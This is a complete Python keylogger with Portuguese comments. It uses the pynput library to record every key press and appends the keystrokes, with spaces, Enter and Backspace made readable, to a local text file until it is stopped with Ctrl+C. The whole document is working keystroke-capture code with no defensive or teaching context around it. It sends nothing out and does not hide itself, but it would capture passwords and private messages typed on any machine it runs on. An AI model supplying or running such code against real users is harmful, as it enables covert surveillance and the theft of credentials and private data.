from pynput.keyboard import Listener

# Caminho do arquivo de log
log_file = "log_teclas.txt"

def ao_pressionar(tecla):
    # Traduz a tecla para string e limpa as aspas
    t = str(tecla).replace("'", "")
    
    # Mapeia teclas especiais para leitura humana
    if t == "Key.space": t = " "
    if t == "Key.enter": t = "\n"
    if t == "Key.backspace": t = "[BACKSPACE]"

    with open(log_file, "a") as f:
        f.write(t)

# Inicia o monitoramento
print("Keylogger ativo... Pressione Ctrl+C para parar.")
with Listener(on_press=ao_pressionar) as monitor:
    monitor.join()
